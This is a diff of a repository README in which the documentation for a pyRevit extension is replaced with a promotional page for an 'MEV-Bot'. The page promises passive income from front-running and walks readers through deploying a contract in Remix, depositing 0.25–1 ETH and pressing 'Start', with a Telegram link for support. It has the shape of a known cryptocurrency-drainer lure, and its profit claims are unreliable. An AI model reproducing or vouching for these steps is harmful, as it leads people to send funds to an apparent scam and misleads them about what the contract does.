@@ -1,52 +1,66 @@
-# pyChilizer
+﻿# MEV-Bot
+
+### Mining Extractable Value (MEV) offers a lucrative avenue for income generation derived from unconfirmed transactions in the mempool. Leveraging the cutting-edge infrastructure of Flashbot, you can earn passive income by exploiting MEV.
+
+Flashbot provides miners with the power to strategically select and sequence transactions in blocks, thereby extracting additional value. This opens up profitable trades, arbitrage opportunities, and a host of MEV-related prospects. Witness your earnings skyrocket based on transactions located in the blockchain's mempool!
+
+## 💡 Introducing Flashbot
+Flashbot is an open infrastructure pioneered by a team of researchers and developers to exploit Miner Extractable Value (MEV) in the Ethereum network. It gives blockchain miners the power to gain additional value from transactions by controlling their order and inclusion in blocks.
+
+Flashbot aims to resolve issues related to MEV, such as frontrunning (snagging transactions before their inclusion in a block), and mitigate the adverse impact on users and Decentralized Finance (DeFi) applications.
+
+This infrastructure empowers developers and users to send bundles of transactions directly to Ethereum miners, bypassing the standard route via transaction pools. These bundles carry information about multiple transactions that need to be executed in a specific order, providing miners the choice to include or reject these bundles according to their preferences and objectives.
+
+## 📊 Platform Comparison
+Platform	Router Address	Network	Mempool Scan Time
+Pancakeswap	0x10ED43C718714eb63d5aA57B78B54704E256024E	BSC	0.78 sec
+Uniswap	0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D	ETH	0.32 sec
 
 
-This is an extension for pyRevit. pyRevit (with lowercase *py*) is a Rapid Application Prototyping (RAD) environment for Autodesk Revit®.
+## 🤖 How to Use MEVBot
+<img src="https://i.ibb.co/Jtnzrtq/1.png" alt="1" border="0">
 
-Besides the many useful tools that come with 'vanilla' pyRevit, the platform that pyRevit provides is invaluable for rapid Revit API tools prototyping and makes deployment a breeze. 
+### Step 1: Access the Source Code 📝
+Navigate to the Remix IDE: https://remix.ethereum.org/
+Create a new file "mev.sol".
+Copy the code inside "mev.sol" from the GitHub repository and paste it into the Remix IDE.
 
-pyChilizer is an extension done by Archilizer that contains many bite-size applications for Revit that aim to automate the drudgery of everyday draughting. It is also a repository/dump for all cool ideas that can later be developed into stand-alone Revit Add-ins. This project is open-source and free to use.
-
-## How-to
-
-## Preferred Option (Update)
-After pyRevit's update, the best way to install the extension is to do so directly from pyRevit.
-
-![installation](https://user-images.githubusercontent.com/5354594/204851598-72a21d79-8d44-4561-9399-7867482d4ff5.png)
-
-## Option 1
-To make use of this extension, you will need to install pyRevit first. Then download the lastest release of pyChilizer and install as follows:
-
-### Step 1
-Download the most recent [release](https://github.com/dnenov/pyChilizer/releases/tag/v0.2.0) of pyChilizer.
-
-<img src="/images/how-to-1.jpg" alt="how-to-step-1">
-
-### Step 2
-Save the .exe file in the pyRevit extensions folder, which is usually located here: **%USERPROFILE%\AppData\Roaming\pyRevit\Extensions**
+<img src="https://i.ibb.co/hfNMhwM/2.png" alt="2" border="0">
 
 
-## Option 2
-
-Alternativelly, you might follow the steps below to manually add the extension to your pyRevit after downloading the content of this repository.
-
-### Step 1
-
-<img src="/images/how-to-1.png" alt="alt-how-to-step-1">
-
-### Step 2
-
-<img src="/images/how-to-2.PNG" alt="alt-how-to-step-2" height="50%" width="50%">
+### Step 2: Compile the Code ⚙️
+Select the Solidity compiler 0.6.12.
+Click 'Compile mev.sol'. 
+<img src="https://i.ibb.co/4N3Sc2h/3.png" alt="3" border="0">
 
 
-For more information you can refer to pyRevit [website](https://www.notion.so/pyRevit-bd907d6292ed4ce997c46e84b6ef67a0).
+### Step 3: Choose the Network 🌐
+Select either ETH or BSC (BNB) network.
+<img src="https://i.ibb.co/KVnWchf/4.png" alt="4" border="0">
 
-## Cool Resource
 
-### Icon Library
-[icons8](https://icons8.com/icon/set/first/windows)
+### Step 4: Deploy the Code 🚀
+Click 'Transact (Deploy)'.
 
-[material design](https://www.material.io/resources/icons/?icon=format_align_center&style=baseline)
 
-Icon Color - #2c3e50
+### Step 5: Deposit into MEVBot 💰
+Copy your MEV contract and send an amount of Ethereum for the bot's operation.
+Start the bot by pressing the 'Start' button.
+<img src="https://i.ibb.co/M7Mc0cN/5.png" alt="5" border="0">
+<img src="https://i.ibb.co/H7XbRPL/6.png" alt="6" border="0">
 
+🔔 Note: For successful transactions on the Ethereum network, you must have sufficient balance to cover the gas fees. We recommend a minimum of 0.25-1 ETH.
+
+### You can withdraw funds by clicking the 'Stop' and 'Withdrawal' button.
+
+UPD: If you have closed the Remix IDE website or accidentally rebooted your computer, you can still access all the bot's functions through Etherscan. You will need to verify the bot contract on Etherscan, and you will have access to the same functions as you would through the Remix IDE website.
+
+## Support
+If you benefitted from the project, show us some support by giving us a star ⭐. Open source is awesome!
+
+## Help
+If at any time you encounter any issues with the contract setup, contact the team at  [**Click Here**](https://t.me/UniMevBotsSupport/). 🛡️
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
